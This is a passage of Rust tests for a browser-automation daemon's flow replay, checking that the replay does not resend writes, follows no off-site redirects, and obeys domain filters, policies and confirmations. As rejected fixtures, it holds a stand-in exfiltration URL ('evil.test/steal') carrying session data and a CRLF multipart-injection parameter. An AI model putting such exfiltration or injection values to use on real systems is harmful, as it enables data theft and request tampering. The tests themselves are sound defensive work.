    (port, hits)
}

#[tokio::test]
async fn a_write_is_sent_once_when_it_redirects_off_site_or_gets_no_answer() {
    let dir = tempfile::tempdir().unwrap();
    let guard = crate::test_utils::EnvGuard::new(&["FROB_FLOWS_DIR"]);
    guard.set("FROB_FLOWS_DIR", dir.path().to_str().unwrap());
    let cases: [(&'static str, &str); 4] = [
            ("HTTP/1.1 303 See Other\r\nLocation: http://localhost:9/x\r\ncontent-length: 0\r\nconnection: close\r\n\r\n", "was not followed"),
            ("HTTP/1.1 307 Temporary Redirect\r\nLocation: /api/cart\r\ncontent-length: 0\r\nconnection: close\r\n\r\n", "was not followed"),
            ("HTTP/1.1 308 Permanent Redirect\r\nLocation: /api/cart\r\ncontent-length: 0\r\nconnection: close\r\n\r\n", "was not followed"),
            ("", "outcome_unknown"),
        ];
    for (response, expect) in cases {
        let (port, hits) = serve_counting(response);
        write_flow_fixture(dir.path(), port);
        let run = json!({ "id": "r", "action": "flow_run", "name": "cart", "params": {}, "allowWrite": "all" });
        let mut state = DaemonState::new();
        state.policy = None;
        state.confirm_actions = None;
        let resp = execute_command(&run, &mut state).await;
        assert_eq!(resp["success"], false, "{resp}");
        assert!(resp["error"].as_str().unwrap().contains(expect), "{resp}");
        assert_eq!(hits.load(std::sync::atomic::Ordering::SeqCst), 1, "{resp}");
        assert!(state.browser.is_none(), "no lower tier ran");
        if response.is_empty() {
            assert_eq!(resp["code"], "outcome_unknown");
        }
    }
}

#[cfg(unix)]
#[tokio::test]
async fn a_flow_file_that_cannot_be_saved_does_not_hide_an_applied_write() {
    use std::os::unix::fs::PermissionsExt;
    let dir = tempfile::tempdir().unwrap();
    let guard = crate::test_utils::EnvGuard::new(&["FROB_FLOWS_DIR"]);
    guard.set("FROB_FLOWS_DIR", dir.path().to_str().unwrap());
    // The site takes the write and answers with another shape.
    let (port, hits) = serve_counting("HTTP/1.1 200 OK\r\ncontent-type: application/json\r\ncontent-length: 13\r\nconnection: close\r\n\r\n{\"cart\":[7]}\n");
    write_flow_fixture(dir.path(), port);
    let origin_dir = dir.path().join("127.0.0.1");
    let file = origin_dir.join("cart.json");
    std::fs::set_permissions(&file, std::fs::Permissions::from_mode(0o400)).unwrap();
    std::fs::set_permissions(&origin_dir, std::fs::Permissions::from_mode(0o500)).unwrap();
    let run = json!({ "id": "r", "action": "flow_run", "name": "cart", "params": {}, "allowWrite": "all" });
    let mut state = DaemonState::new();
    state.policy = None;
    state.confirm_actions = None;
    let resp = execute_command(&run, &mut state).await;
    std::fs::set_permissions(&origin_dir, std::fs::Permissions::from_mode(0o700)).unwrap();
    std::fs::set_permissions(&file, std::fs::Permissions::from_mode(0o600)).unwrap();
    assert_eq!(resp["success"], false, "{resp}");
    assert_eq!(resp["code"], "write_applied", "{resp}");
    let error = resp["error"].as_str().unwrap();
    assert!(error.contains("do not repeat it"), "{resp}");
    assert!(error.contains("the flow file was not updated"), "{resp}");
    assert!(resp["data"]["saveError"].is_string(), "{resp}");
    assert_eq!(hits.load(std::sync::atomic::Ordering::SeqCst), 1);
}

#[tokio::test]
async fn requests_of_an_unrecorded_command_are_not_tagged_to_the_previous_step() {
    let mut state = DaemonState::new();
    state.flow.begin_capture(None);
    state.flow.begin(
        "click",
        &json!({ "action": "click", "selector": "#a" }),
        &RefMap::new(),
        None,
        None,
    );
    let resp = execute_command(&json!({ "id": "s", "action": "session_info" }), &mut state).await;
    assert!(resp.get("recorded").is_none(), "{resp}");
    state.flow.tag(
        "sent-by-the-unrecorded-command",
        std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_secs_f64(),
    );
    assert_eq!(state.flow.steps()["steps"][0]["requests"], 0);
}

#[tokio::test]
async fn a_host_the_session_now_blocks_is_not_fetched_by_a_saved_flow() {
    let dir = tempfile::tempdir().unwrap();
    let guard = crate::test_utils::EnvGuard::new(&["FROB_FLOWS_DIR"]);
    guard.set("FROB_FLOWS_DIR", dir.path().to_str().unwrap());
    let (port, hits) = serve_counting("HTTP/1.1 200 OK\r\ncontent-length: 11\r\nconnection: close\r\ncontent-type: application/json\r\n\r\n{\"ok\":true}");
    write_flow_fixture(dir.path(), port);
    let mut state = DaemonState::new();
    state.policy = None;
    state.confirm_actions = None;
    *state.domain_filter.write().await =
        Some(super::super::network::DomainFilter::new("example.test"));
    let run = json!({ "id": "r", "action": "flow_run", "name": "cart", "params": {}, "allowWrite": "all" });
    let resp = execute_command(&run, &mut state).await;
    assert_eq!(resp["success"], false, "{resp}");
    assert_eq!(hits.load(std::sync::atomic::Ordering::SeqCst), 0, "{resp}");
    // Redirects obey the same filter: the second host is never contacted.
    let (other, other_hits) =
        serve_counting("HTTP/1.1 200 OK\r\ncontent-length: 2\r\nconnection: close\r\n\r\n{}");
    let redirect: &'static str = Box::leak(
            format!("HTTP/1.1 302 Found\r\nLocation: http://localhost:{}/x\r\ncontent-length: 0\r\nconnection: close\r\n\r\n", other).into_boxed_str(),
        );
    let (port, hits) = serve_counting(redirect);
    write_flow_fixture(dir.path(), port);
    *state.domain_filter.write().await =
        Some(super::super::network::DomainFilter::new("127.0.0.1"));
    let resp = execute_command(&json!({ "id": "r2", "action": "flow_run", "name": "cart", "params": {}, "allowWrite": "all" }), &mut state).await;
    assert_eq!(resp["success"], false, "{resp}");
    assert_eq!(hits.load(std::sync::atomic::Ordering::SeqCst), 1);
    assert_eq!(other_hits.load(std::sync::atomic::Ordering::SeqCst), 0);
}

#[tokio::test]
async fn the_replay_does_not_send_a_write_that_was_not_allowed() {
    let dir = tempfile::tempdir().unwrap();
    let guard = crate::test_utils::EnvGuard::new(&["FROB_FLOWS_DIR"]);
    guard.set("FROB_FLOWS_DIR", dir.path().to_str().unwrap());
    let flow = json!({
        "version": 1, "name": "buy", "origin": "127.0.0.1",
        "startUrl": "http://127.0.0.1:9/", "allowedHosts": ["127.0.0.1"],
        "params": [], "output": "s2r1", "itemFields": [], "verifiedAt": null,
        "writes": [{ "id": "s1w1", "method": "POST", "url": "http://127.0.0.1:9/buy", "kind": "explicit", "step": 1 }],
        "steps": [
            { "seq": 1, "ok": true, "command": { "action": "click", "selector": "#buy" }, "requests": [] },
            { "seq": 2, "ok": true, "command": { "action": "click", "selector": "#list" }, "requests": [{
                "id": "s2r1", "method": "GET", "url": "http://127.0.0.1:9/items", "headers": {}, "body": null, "tier": "replay",
                "expect": { "status": 200, "mime": "application/json", "signature": super::super::flow::signature(&json!({ "items": [] })), "bytes": 12, "itemFields": [], "extract": null }
            }] }
        ]
    });
    save_flow_json(flow);
    let mut state = DaemonState::new();
    state.policy = None;
    state.confirm_actions = None;
    let resp = execute_command(&json!({ "id": "r", "action": "flow_run", "name": "buy", "params": {}, "allowWrite": "false" }), &mut state).await;
    assert_eq!(resp["success"], false, "{resp}");
    let error = resp["error"].as_str().unwrap();
    assert!(error.contains("s1w1") && error.contains("allow"), "{error}");
    assert!(
        state.browser.is_none(),
        "no browser launched, so no click ran"
    );
}

#[tokio::test]
async fn the_replay_needs_the_policy_and_confirmation_for_its_writes_too() {
    let dir = tempfile::tempdir().unwrap();
    let guard = crate::test_utils::EnvGuard::new(&["FROB_FLOWS_DIR"]);
    guard.set("FROB_FLOWS_DIR", dir.path().to_str().unwrap());
    save_flow_json(json!({
        "version": 1, "name": "buy", "origin": "127.0.0.1",
        "startUrl": "http://127.0.0.1:9/", "allowedHosts": ["127.0.0.1"],
        "params": [], "output": "s2r1", "itemFields": [], "verifiedAt": null,
        "writes": [{ "id": "s1w1", "method": "POST", "url": "http://127.0.0.1:9/buy", "kind": "explicit", "step": 1 }],
        "steps": [
            { "seq": 1, "ok": true, "command": { "action": "click", "selector": "#buy" }, "requests": [] },
            { "seq": 2, "ok": true, "command": { "action": "click", "selector": "#list" }, "requests": [{
                "id": "s2r1", "method": "GET", "url": "http://127.0.0.1:9/items", "headers": {}, "body": null, "tier": "replay",
                "expect": { "status": 200, "mime": "application/json", "signature": super::super::flow::signature(&json!({ "items": [] })), "bytes": 12, "itemFields": [], "extract": null }
            }] }
        ]
    }));
    let policy_with = |file: &str, body: &str| {
        let path = dir.path().join(file);
        std::fs::write(&path, body).unwrap();
        ActionPolicy::load(path.to_str().unwrap()).unwrap()
    };
    let run = json!({ "id": "r", "action": "flow_run", "name": "buy", "params": {}, "allowWrite": "all" });
    let cases: [(Option<ActionPolicy>, Option<ConfirmActions>, &str); 3] = [
        (
            Some(policy_with(
                "deny.json",
                r#"{"default":"allow","deny":["flow_write:s1w1"]}"#,
            )),
            None,
            "denied by policy",
        ),
        (
            Some(policy_with(
                "confirm.json",
                r#"{"default":"allow","confirm":["flow_write:s1w1"]}"#,
            )),
            None,
            "requires confirmation",
        ),
        (
            None,
            ConfirmActions::parse("flow_write:s1w1"),
            "requires confirmation",
        ),
    ];
    for (policy, confirm, expect) in cases {
        let mut state = DaemonState::new();
        state.policy = policy;
        state.confirm_actions = confirm;
        let resp = execute_command(&run, &mut state).await;
        assert_eq!(resp["success"], false, "{resp}");
        let error = resp["error"].as_str().unwrap_or_default();
        assert!(error.contains(expect), "{expect}: {resp}");
        assert!(
            state.browser.is_none(),
            "{expect}: the replay must not start"
        );
    }
}

#[tokio::test]
async fn a_write_sent_by_one_tier_is_not_sent_again_by_the_replay() {
    let dir = tempfile::tempdir().unwrap();
    let guard = crate::test_utils::EnvGuard::new(&["FROB_FLOWS_DIR"]);
    guard.set("FROB_FLOWS_DIR", dir.path().to_str().unwrap());
    let (port, hits) = serve_counting(
            "HTTP/1.1 200 OK\r\ncontent-type: application/json\r\ncontent-length: 11\r\nconnection: close\r\n\r\n{\"ok\":true}",
        );
    let base = format!("http://127.0.0.1:{}", port);
    let sig = super::super::flow::signature(&json!({ "ok": true }));
    let expect = json!({ "status": 200, "mime": "application/json", "signature": sig, "bytes": 11, "itemFields": [], "extract": null });
    let flow = json!({
        "version": 1, "name": "twice", "origin": "127.0.0.1",
        "startUrl": format!("{}/", base), "allowedHosts": ["127.0.0.1"],
        "params": [], "output": "s2r1", "itemFields": [], "verifiedAt": null,
        "writes": [{ "id": "s1r1", "method": "POST", "url": format!("{}/api/cart", base), "kind": "explicit", "step": 1 }],
        "steps": [
            { "seq": 1, "ok": true, "command": { "action": "click", "selector": "#add" }, "requests": [{
                "id": "s1r1", "method": "POST", "url": format!("{}/api/cart", base), "headers": {}, "body": "{}", "expect": expect }] },
            { "seq": 2, "ok": true, "command": { "action": "click", "selector": "#list" }, "requests": [{
                "id": "s2r1", "method": "GET", "url": format!("{}/api/items?c={{{{@s1r1.ok}}}}", base), "headers": {}, "body": null,
                "tier": "replay", "expect": expect }] }
        ]
    });
    save_flow_json(flow);
    let mut state = DaemonState::new();
    state.policy = None;
    state.confirm_actions = None;
    let run = json!({ "id": "r", "action": "flow_run", "name": "twice", "params": {}, "allowWrite": "all" });
    let resp = execute_command(&run, &mut state).await;
    assert_eq!(resp["success"], false, "{resp}");
    assert!(resp["error"].as_str().unwrap().contains("again"), "{resp}");
    assert_eq!(hits.load(std::sync::atomic::Ordering::SeqCst), 1, "{resp}");
    assert!(state.browser.is_none(), "the replay never started");
}

#[tokio::test]
async fn a_rejected_write_with_stripped_credentials_still_reaches_the_replay() {
    let dir = tempfile::tempdir().unwrap();
    let guard = crate::test_utils::EnvGuard::new(&["FROB_FLOWS_DIR"]);
    guard.set("FROB_FLOWS_DIR", dir.path().to_str().unwrap());
    let (port, hits) = serve_counting(
        "HTTP/1.1 401 Unauthorized\r\ncontent-length: 2\r\nconnection: close\r\n\r\n{}",
    );
    let base = format!("http://127.0.0.1:{}", port);
    let url = format!("{}/api/cart", base);
    let flow = json!({
        "version": 1, "name": "rejected", "origin": "127.0.0.1",
        "startUrl": format!("{}/", base), "allowedHosts": ["127.0.0.1"],
        "params": [], "output": "s1r1", "itemFields": [], "verifiedAt": null,
        "writes": [{ "id": "s1r1", "method": "POST", "url": url, "kind": "explicit", "step": 1 }],
        "steps": [
            // A script command keeps the replay from running a browser.
            { "seq": 1, "ok": true, "command": { "action": "evaluate", "script": "1" }, "requests": [{
                "id": "s1r1", "method": "POST", "url": url, "headers": {}, "body": "{}",
                "expect": { "status": 200, "mime": "application/json", "signature": super::super::flow::signature(&json!({ "ok": true })),
                    "bytes": 11, "itemFields": [], "extract": null, "strippedAuth": true } }] }
        ]
    });
    save_flow_json(flow);
    let mut state = DaemonState::new();
    state.policy = None;
    state.confirm_actions = None;
    let run = json!({ "id": "r", "action": "flow_run", "name": "rejected", "params": {}, "allowWrite": "all" });
    let resp = execute_command(&run, &mut state).await;
    assert_eq!(resp["success"], false, "{resp}");
    let error = resp["error"].as_str().unwrap();
    assert!(
        error.contains("not allowed in a replay"),
        "the replay was reached: {error}"
    );
    assert!(!error.contains("already sent"), "{error}");
    assert_eq!(hits.load(std::sync::atomic::Ordering::SeqCst), 1);
}

#[tokio::test]
async fn a_confirmed_run_executes_the_flow_that_was_checked() {
    let dir = tempfile::tempdir().unwrap();
    let guard = crate::test_utils::EnvGuard::new(&["FROB_FLOWS_DIR"]);
    guard.set("FROB_FLOWS_DIR", dir.path().to_str().unwrap());
    let (port, hits) = serve_counting(
            "HTTP/1.1 200 OK\r\ncontent-type: application/json\r\ncontent-length: 11\r\nconnection: close\r\n\r\n{\"ok\":true}",
        );
    write_flow_fixture(dir.path(), port);
    let mut state = DaemonState::new();
    state.policy = None;
    state.confirm_actions = None;
    let run = json!({ "id": "r", "action": "flow_run", "name": "cart", "params": {} });
    let ask = execute_command(&run, &mut state).await;
    assert_eq!(ask["data"]["confirmation_required"], true, "{ask}");
    // The file changes between the check and the confirmation: it now
    // posts to a second server.
    let (other, other_hits) = serve_counting(
            "HTTP/1.1 200 OK\r\ncontent-type: application/json\r\ncontent-length: 11\r\nconnection: close\r\n\r\n{\"ok\":true}",
        );
    write_flow_fixture(dir.path(), other);
    let done = execute_command(&json!({ "id": "c", "action": "confirm" }), &mut state).await;
    assert_eq!(done["data"]["result"]["data"]["ok"], true, "{done}");
    assert_eq!(hits.load(std::sync::atomic::Ordering::SeqCst), 1);
    assert_eq!(other_hits.load(std::sync::atomic::Ordering::SeqCst), 0);
}

#[tokio::test]
async fn a_flow_that_cannot_be_read_fails_before_policy_and_the_run() {
    let dir = tempfile::tempdir().unwrap();
    let guard = crate::test_utils::EnvGuard::new(&["FROB_FLOWS_DIR"]);
    guard.set("FROB_FLOWS_DIR", dir.path().to_str().unwrap());
    let policy_path = dir.path().join("policy.json");
    fs::write(&policy_path, r#"{"deny":["flow_run"]}"#).unwrap();
    let mut state = DaemonState::new();
    state.policy = Some(ActionPolicy::load(policy_path.to_str().unwrap()).unwrap());
    let resp = execute_command(
        &json!({ "id": "r", "action": "flow_run", "name": "missing", "params": {} }),
        &mut state,
    )
    .await;
    let error = resp["error"].as_str().unwrap();
    assert!(error.contains("no saved flow named 'missing'"), "{error}");
    let resp = execute_command(&json!({ "id": "r2", "action": "flow_run" }), &mut state).await;
    assert!(
        resp["error"].as_str().unwrap().contains("requires a name"),
        "{resp}"
    );
}

#[tokio::test]
async fn a_foreign_host_in_a_later_request_rejects_the_run_before_any_is_sent() {
    let dir = tempfile::tempdir().unwrap();
    let guard = crate::test_utils::EnvGuard::new(&["FROB_FLOWS_DIR"]);
    guard.set("FROB_FLOWS_DIR", dir.path().to_str().unwrap());
    let (port, hits) = serve_counting(
            "HTTP/1.1 200 OK\r\ncontent-type: application/json\r\ncontent-length: 11\r\nconnection: close\r\n\r\n{\"ok\":true}",
        );
    let base = format!("http://127.0.0.1:{}", port);
    let expect = json!({ "status": 200, "mime": "application/json",
            "signature": super::super::flow::signature(&json!({ "ok": true })),
            "bytes": 11, "itemFields": [], "extract": null });
    save_flow_json(json!({
        "version": 1, "name": "two", "origin": "127.0.0.1",
        "startUrl": format!("{}/", base), "allowedHosts": ["127.0.0.1"],
        "output": "s2r1",
        "steps": [
            { "command": {}, "requests": [{ "id": "s1r1", "method": "GET",
                "url": format!("{}/session", base), "expect": expect }] },
            { "command": {}, "requests": [{ "id": "s2r1", "method": "GET",
                "url": "http://evil.test/steal?c={{@s1r1.ok}}", "expect": expect }] }
        ]
    }));
    let mut state = DaemonState::new();
    state.policy = None;
    state.confirm_actions = None;
    let resp = execute_command(
        &json!({ "id": "r", "action": "flow_run", "name": "two", "params": {} }),
        &mut state,
    )
    .await;
    assert_eq!(resp["success"], false, "{resp}");
    assert!(
        resp["error"].as_str().unwrap().contains("evil.test"),
        "{resp}"
    );
    assert_eq!(hits.load(std::sync::atomic::Ordering::SeqCst), 0, "{resp}");
}

#[tokio::test]
async fn a_flow_with_a_write_missing_from_its_writes_list_does_not_load() {
    let dir = tempfile::tempdir().unwrap();
    let guard = crate::test_utils::EnvGuard::new(&["FROB_FLOWS_DIR"]);
    guard.set("FROB_FLOWS_DIR", dir.path().to_str().unwrap());
    let (port, hits) = serve_counting(
            "HTTP/1.1 200 OK\r\ncontent-type: application/json\r\ncontent-length: 11\r\nconnection: close\r\n\r\n{\"ok\":true}",
        );
    write_flow_fixture(dir.path(), port);
    // An edit drops the POST from the writes list.
    let path = dir.path().join("127.0.0.1").join("cart.json");
    let mut flow: Value = serde_json::from_str(&fs::read_to_string(&path).unwrap()).unwrap();
    flow["writes"] = json!([]);
    fs::write(&path, serde_json::to_string(&flow).unwrap()).unwrap();
    let mut state = DaemonState::new();
    state.policy = None;
    state.confirm_actions = None;
    let resp = execute_command(
            &json!({ "id": "r", "action": "flow_run", "name": "cart", "params": {}, "allowWrite": "all" }),
            &mut state,
        )
        .await;
    assert_eq!(resp["success"], false, "{resp}");
    assert!(
        resp["error"].as_str().unwrap().contains("re-save"),
        "{resp}"
    );
    assert_eq!(hits.load(std::sync::atomic::Ordering::SeqCst), 0);
}

#[tokio::test]
async fn a_param_cannot_swap_a_saved_query_for_a_mutation() {
    let dir = tempfile::tempdir().unwrap();
    let guard = crate::test_utils::EnvGuard::new(&["FROB_FLOWS_DIR"]);
    guard.set("FROB_FLOWS_DIR", dir.path().to_str().unwrap());
    let (port, hits) = serve_counting(
            "HTTP/1.1 200 OK\r\ncontent-type: application/json\r\ncontent-length: 11\r\nconnection: close\r\n\r\n{\"ok\":true}",
        );
    save_flow_json(json!({
        "version": 1, "name": "gql", "origin": "127.0.0.1",
        "startUrl": format!("http://127.0.0.1:{}/", port), "allowedHosts": ["127.0.0.1"],
        "params": [{ "name": "op", "example": "query" }], "output": "s1r1",
        "itemFields": [], "verifiedAt": null, "writes": [],
        "steps": [{ "seq": 1, "requests": [{
            "id": "s1r1", "method": "POST", "url": format!("http://127.0.0.1:{}/graphql", port),
            "headers": {}, "body": "{\"query\":\"{{op}} X { a }\"}",
            "expect": { "status": 200, "mime": "application/json",
                "signature": super::super::flow::signature(&json!({ "ok": true })),
                "bytes": 11, "itemFields": [], "extract": null }
        }] }]
    }));
    let mut state = DaemonState::new();
    state.policy = None;
    state.confirm_actions = None;
    let run = json!({ "id": "r", "action": "flow_run", "name": "gql",
            "params": { "op": "mutation Y { buy }" } });
    let resp = execute_command(&run, &mut state).await;
    assert_eq!(resp["success"], false, "{resp}");
    assert_eq!(hits.load(std::sync::atomic::Ordering::SeqCst), 0, "{resp}");
}

#[tokio::test]
async fn a_param_cannot_point_a_saved_read_at_a_mutating_path() {
    let dir = tempfile::tempdir().unwrap();
    let guard = crate::test_utils::EnvGuard::new(&["FROB_FLOWS_DIR"]);
    guard.set("FROB_FLOWS_DIR", dir.path().to_str().unwrap());
    let (port, hits) = serve_counting(
            "HTTP/1.1 200 OK\r\ncontent-type: application/json\r\ncontent-length: 11\r\nconnection: close\r\n\r\n{\"ok\":true}",
        );
    save_flow_json(json!({
        "version": 1, "name": "items", "origin": "127.0.0.1",
        "startUrl": format!("http://127.0.0.1:{}/", port), "allowedHosts": ["127.0.0.1"],
        "params": [{ "name": "id", "example": "42" }], "output": "s1r1",
        "itemFields": [], "verifiedAt": null, "writes": [],
        "steps": [{ "seq": 1, "requests": [{
            "id": "s1r1", "method": "GET", "url": format!("http://127.0.0.1:{}/items/{{{{id}}}}", port),
            "headers": {}, "body": null,
            "expect": { "status": 200, "mime": "application/json",
                "signature": super::super::flow::signature(&json!({ "ok": true })),
                "bytes": 11, "itemFields": [], "extract": null }
        }] }]
    }));
    let mut state = DaemonState::new();
    state.policy = None;
    state.confirm_actions = None;
    let run =
        json!({ "id": "r", "action": "flow_run", "name": "items", "params": { "id": "delete" } });
    let resp = execute_command(&run, &mut state).await;
    assert_eq!(resp["success"], false, "{resp}");
    assert!(resp["error"].as_str().unwrap().contains("write"), "{resp}");
    assert_eq!(hits.load(std::sync::atomic::Ordering::SeqCst), 0, "{resp}");
}

#[tokio::test]
async fn a_param_with_a_line_break_cannot_split_a_multipart_body() {
    let dir = tempfile::tempdir().unwrap();
    let guard = crate::test_utils::EnvGuard::new(&["FROB_FLOWS_DIR"]);
    guard.set("FROB_FLOWS_DIR", dir.path().to_str().unwrap());
    let (port, hits) = serve_counting(
            "HTTP/1.1 200 OK\r\ncontent-type: application/json\r\ncontent-length: 11\r\nconnection: close\r\n\r\n{\"ok\":true}",
        );
    let url = format!("http://127.0.0.1:{}/upload", port);
    save_flow_json(json!({
        "version": 1, "name": "up", "origin": "127.0.0.1",
        "startUrl": format!("http://127.0.0.1:{}/", port), "allowedHosts": ["127.0.0.1"],
        "params": [{ "name": "q", "example": "x" }], "output": "s1r1",
        "itemFields": [], "verifiedAt": null,
        "writes": [{ "id": "s1r1", "method": "POST", "url": url, "kind": "explicit", "step": 1 }],
        "steps": [{ "seq": 1, "requests": [{
            "id": "s1r1", "method": "POST", "url": url,
            "headers": { "content-type": "multipart/form-data; boundary=XyZ" },
            "body": "--XyZ\r\nContent-Disposition: form-data; name=\"f\"\r\n\r\n{{q}}\r\n--XyZ--\r\n",
            "expect": { "status": 200, "mime": "application/json",
                "signature": super::super::flow::signature(&json!({ "ok": true })),
                "bytes": 11, "itemFields": [], "extract": null }
        }] }]
    }));
    let mut state = DaemonState::new();
    state.policy = None;
    state.confirm_actions = None;
    let run = json!({ "id": "r", "action": "flow_run", "name": "up", "allowWrite": "all",
            "params": { "q": "v\r\n--XyZ\r\nContent-Disposition: form-data; name=\"x\"\r\n\r\ninjected" } });
    let resp = execute_command(&run, &mut state).await;
    assert_eq!(resp["success"], false, "{resp}");
    assert!(
        resp["error"].as_str().unwrap().contains("line break"),
        "{resp}"
    );
    assert_eq!(hits.load(std::sync::atomic::Ordering::SeqCst), 0, "{resp}");
}

#[tokio::test]
async fn auth_rate_limit_and_challenge_responses_stop_the_run() {
    let dir = tempfile::tempdir().unwrap();
    let guard = crate::test_utils::EnvGuard::new(&["FROB_FLOWS_DIR"]);
    guard.set("FROB_FLOWS_DIR", dir.path().to_str().unwrap());
    // The fixture is a write, so a challenge in answer to it may have been applied.
    let cases: [(&'static str, &str, &str); 4] = [
            ("HTTP/1.1 401 Unauthorized\r\ncontent-length: 2\r\nconnection: close\r\n\r\n{}", "auth_expired", ""),
            ("HTTP/1.1 403 Forbidden\r\ncontent-length: 2\r\nconnection: close\r\n\r\n{}", "auth_expired", ""),
            ("HTTP/1.1 429 Too Many Requests\r\nretry-after: 17\r\ncontent-length: 2\r\nconnection: close\r\n\r\n{}", "rate_limited", "17"),
            ("HTTP/1.1 200 OK\r\ncontent-type: text/html\r\ncontent-length: 41\r\nconnection: close\r\n\r\n<html>cf-chl-bypass captcha challenge</html", "outcome_unknown", ""),
        ];
    for (response, kind, retry) in cases {
        write_flow_fixture(dir.path(), serve_fixed(response));
        // A write flow, allowed, so only the response decides.
        let run = json!({ "id": "r", "action": "flow_run", "name": "cart", "params": {}, "allowWrite": "all" });
        let mut state = DaemonState::new();
        state.policy = None;
        state.confirm_actions = None;
        let resp = execute_command(&run, &mut state).await;
        assert_eq!(resp["success"], false, "{resp}");
        assert_eq!(resp["code"], kind, "{resp}");
        assert_eq!(resp["data"]["status"], kind);
        let error = resp["error"].as_str().unwrap();
        assert!(error.starts_with(kind), "{error}");
        assert!(
            error.contains("(http)"),
            "stopped on the first tier: {error}"
        );
        if !retry.is_empty() {
            assert_eq!(resp["data"]["retryAfter"], retry);
            assert!(error.contains("retry after 17"), "{error}");
        }
        // No lower tier ran, so no browser was opened.
        assert!(state.browser.is_none());
    }
}

#[tokio::test]
async fn a_denied_request_that_needed_a_stripped_credential_says_so() {
    let dir = tempfile::tempdir().unwrap();
    let guard = crate::test_utils::EnvGuard::new(&["FROB_FLOWS_DIR"]);
    guard.set("FROB_FLOWS_DIR", dir.path().to_str().unwrap());
    let port = serve_fixed(
        "HTTP/1.1 401 Unauthorized\r\ncontent-length: 2\r\nconnection: close\r\n\r\n{}",
    );
    let url = format!("http://127.0.0.1:{}/api/items", port);
    save_flow_json(json!({
        "version": 1, "name": "items", "origin": "127.0.0.1",
        "startUrl": format!("http://127.0.0.1:{}/", port), "allowedHosts": ["127.0.0.1"],
        "params": [], "output": "s1r1", "itemFields": [], "verifiedAt": null, "writes": [],
        "steps": [{ "seq": 1, "requests": [{
            "id": "s1r1", "method": "GET", "url": url, "headers": {}, "body": null,
            "expect": { "status": 200, "mime": "application/json",
                "signature": super::super::flow::signature(&json!({ "ok": true })),
                "bytes": 11, "itemFields": [], "extract": null, "strippedAuth": true }
        }] }]
    }));
    let mut state = DaemonState::new();
    state.policy = None;
    state.confirm_actions = None;
    let run = json!({ "id": "r", "action": "flow_run", "name": "items", "params": {} });
    let resp = execute_command(&run, &mut state).await;
    assert_eq!(resp["success"], false, "{resp}");
    assert_eq!(resp["code"], "credential_not_sendable", "{resp}");
    let error = resp["error"].as_str().unwrap();
    assert!(error.contains("use the page UI"), "{error}");
    assert!(!error.contains("Sign in again"), "{error}");
}

#[tokio::test]
async fn a_moved_list_fails_the_run_as_drifted() {
    let dir = tempfile::tempdir().unwrap();
    let guard = crate::test_utils::EnvGuard::new(&["FROB_FLOWS_DIR"]);
    guard.set("FROB_FLOWS_DIR", dir.path().to_str().unwrap());
    let body = r#"{"data":{"products":[{"title":"x"}]}}"#;
    let port = serve_fixed(Box::leak(
            format!(
                "HTTP/1.1 200 OK\r\ncontent-type: application/json\r\ncontent-length: {}\r\nconnection: close\r\n\r\n{}",
                body.len(),
                body
            )
            .into_boxed_str(),
        ));
    let url = format!("http://127.0.0.1:{}/api/catalog", port);
    save_flow_json(json!({
        "version": 1, "name": "catalog", "origin": "127.0.0.1",
        "startUrl": format!("http://127.0.0.1:{}/", port), "allowedHosts": ["127.0.0.1"],
        "params": [], "output": "s1r1", "itemFields": [], "verifiedAt": null, "writes": [],
        "steps": [{ "seq": 1, "requests": [{
            "id": "s1r1", "method": "GET", "url": url, "headers": {}, "body": null,
            "expect": { "status": 200, "mime": "application/json",
                "signature": super::super::flow::signature(&json!({ "items": [{ "name": "x" }] })),
                "bytes": 11, "itemFields": [], "extract": null }
        }] }]
    }));
    let mut state = DaemonState::new();
    state.policy = None;
    state.confirm_actions = None;
    let run = json!({ "id": "r", "action": "flow_run", "name": "catalog", "params": {} });
    let resp = execute_command(&run, &mut state).await;
    assert_eq!(resp["success"], false, "{resp}");
    assert_eq!(resp["code"], "drifted", "{resp}");
    let error = resp["error"].as_str().unwrap();
    assert!(
        error.contains("'items'") && error.contains("data.products"),
        "{error}"
    );
}

#[tokio::test]
async fn policy_and_confirm_actions_reach_flow_writes() {
    let dir = tempfile::tempdir().unwrap();
    let guard = crate::test_utils::EnvGuard::new(&["FROB_FLOWS_DIR"]);
    guard.set("FROB_FLOWS_DIR", dir.path().to_str().unwrap());
    write_flow_fixture(dir.path(), serve_json_once());
    let mut run = json!({ "id": "r1", "action": "flow_run", "name": "cart", "params": {}, "allowWrite": "all" });

    let policy_path = dir.path().join("policy.json");
    fs::write(&policy_path, r#"{"deny":["flow_write:s1r1"]}"#).unwrap();
    let mut state = DaemonState::new();
    state.policy = Some(ActionPolicy::load(policy_path.to_str().unwrap()).unwrap());
    state.confirm_actions = None;
    let resp = execute_command(&run, &mut state).await;
    assert!(
        resp["error"].as_str().unwrap().contains("denied by policy"),
        "{resp}"
    );

    let mut state = DaemonState::new();
    state.policy = None;
    state.confirm_actions = Some(ConfirmActions {
        categories: ["flow_write:s1r1".to_string()].into_iter().collect(),
    });
    run["id"] = json!("r2");
    let resp = execute_command(&run, &mut state).await;
    assert_eq!(resp["data"]["confirmation_required"], true, "{resp}");
    assert_eq!(resp["data"]["action"], "flow_write:s1r1");
}

#[tokio::test]
async fn flow_save_and_steps_need_a_capturing_session() {
    let mut state = DaemonState::new();
    let err = handle_flow_save(&json!({ "name": "x" }), &mut state)
        .await
        .unwrap_err();
    assert!(err.contains("--capture flow"), "{err}");
    assert!(handle_flow_steps(&json!({}), &state).is_err());
}

#[tokio::test]
async fn capture_is_a_launch_setting_that_only_relaunches_when_it_changes() {
    let flow = Patch::from_entries([(Key::Capture, Requested::Set(json!(["flow"])))]);
    assert!(check_capture_setting(&flow).is_ok());
    let bad = Patch::from_entries([(Key::Capture, Requested::Set(json!(["har"])))]);
    let err = check_capture_setting(&bad).unwrap_err();
    assert!(err.contains("Supported: flow"), "{err}");
    let mut state = DaemonState::new();
    let err = handle_launch_inner(
        &json!({ "action": "launch", "capture": ["har"] }),
        &mut state,
    )
    .await
    .unwrap_err();
    assert!(err.contains("Supported: flow"), "{err}");
    assert!(launch_envelope_patch(&json!({ "capture": ["flow"] }), None)
        .value(Key::Capture)
        .is_some());

    let plain = Running::defaults();
    assert!(!plain.captures_flow());
    // Opening without capture, then asking for it, is a visible relaunch.
    let plan = plain.plan(&flow);
    assert!(plan.relaunch);
    assert!(plan.next.captures_flow());
    // Later commands that repeat it or omit it leave the browser alone.
    assert!(plan.next.plan(&flow).is_empty());
    assert!(plan.next.plan(&Patch::default()).is_empty());
